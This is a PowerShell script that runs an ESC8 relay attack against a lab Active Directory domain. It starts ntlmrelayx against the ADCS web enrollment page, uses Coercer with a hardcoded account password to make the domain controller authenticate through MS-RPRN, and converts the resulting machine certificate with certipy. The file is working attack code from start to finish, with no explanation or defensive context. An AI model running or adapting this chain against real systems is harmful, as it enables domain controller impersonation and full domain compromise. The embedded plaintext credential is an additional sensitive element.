# ESC8 (WT052) v5 - full relay chain execution on custom SMB port 8445
# Root cause of prior 445 failures: srv2 kernel driver holds 445. v5 avoids it.
# ntlmrelayx listens on 8445; coercer triggers dc01$ MS-RPRN to auth to ws01:8445;
# relay forwards NTLM to ADCS web enrollment and captures a Machine cert.
$ErrorActionPreference = "Continue"

$venv    = "C:\Tools\RedStrike\.venv\Scripts"
$work    = "C:\Tools\cadre-attack"
$outdir  = "$work\esc8-v5"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null
Set-Location $work

$relayLog  = "$outdir\relay.log"
$relayErr  = "$outdir\relay.err"
$coerceLog = "$outdir\coerce.log"

$listenerIp = "192.168.77.62"
$smbPort    = "8445"
$adcsTarget = "http://dc01.cadre.local/certsrv/certfnsh.asp"
$dcIp       = "192.168.77.10"

Write-Output "=== ESC8 v5 relay chain | $(Get-Date -Format o) ==="
Write-Output "listener=${listenerIp}:${smbPort} adcs=${adcsTarget}"

# --- 1. Start ntlmrelayx on custom SMB port 8445 (direct python start, proven) ---
Remove-Item $relayLog,$relayErr -ErrorAction SilentlyContinue
$relayArgs = @("$venv\ntlmrelayx.py","--smb-port",$smbPort,"-t",$adcsTarget,"--adcs","--template","Machine","-smb2support","-ip",$listenerIp,"-debug")
$relayProc = Start-Process -FilePath "$venv\python.exe" -ArgumentList $relayArgs `
  -WorkingDirectory $work -WindowStyle Hidden -PassThru `
  -RedirectStandardOutput $relayLog -RedirectStandardError $relayErr
Write-Output "relay_pid=$($relayProc.Id)"
Start-Sleep -Seconds 12

$listen = Get-NetTCPConnection -LocalPort $smbPort -State Listen -ErrorAction SilentlyContinue
Write-Output "relay_listening_${smbPort}=$([bool]$listen)"

# --- 2. Coerce dc01$ MS-RPRN -> ws01:8445 ---
$env:PYTHONIOENCODING = "utf-8"
Write-Output "=== coercing dc01$ MS-RPRN to ${listenerIp}:${smbPort} ==="
& "$venv\coercer.exe" coerce `
  -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip $dcIp `
  -t $dcIp -l $listenerIp --smb-port $smbPort `
  --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1 | Tee-Object -FilePath $coerceLog
Write-Output "coerce_rc=$LASTEXITCODE"

# --- 3. Wait for relay processing + cert issuance ---
Write-Output "waiting 25s for relay processing..."
Start-Sleep -Seconds 25

Write-Output "=== relay.log tail ==="
if (Test-Path $relayLog) { Get-Content $relayLog -Tail 50 }
Write-Output "=== relay.err tail ==="
if (Test-Path $relayErr) { Get-Content $relayErr -Tail 20 }

# --- 4. Look for captured certs (ntlmrelayx --adcs writes .pem in cwd) ---
Write-Output "=== captured pem files ==="
$pems = Get-ChildItem $work -Filter "*.pem" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
if ($pems) {
  $pems | ForEach-Object { Write-Output "$($_.LastWriteTime) $($_.Name) $($_.Length)" }
  $certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
  $base = $pems[0].BaseName -replace "_key$",""
  Write-Output "=== certipy cert -pfx ==="
  & $certpy cert -pfx "$work\$base" -password "" -out "$outdir\certs" 2>&1 | Select-Object -Last 15
  Get-ChildItem "$outdir\certs" -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "OUT: $($_.Name)" }
} else {
  Write-Output "NO_PEM_CAPTURED"
}

# --- 5. Cleanup ---
if ($relayProc -and -not $relayProc.HasExited) { Stop-Process -Id $relayProc.Id -Force -ErrorAction SilentlyContinue }
Write-Output "=== ESC8_V5_DONE ==="
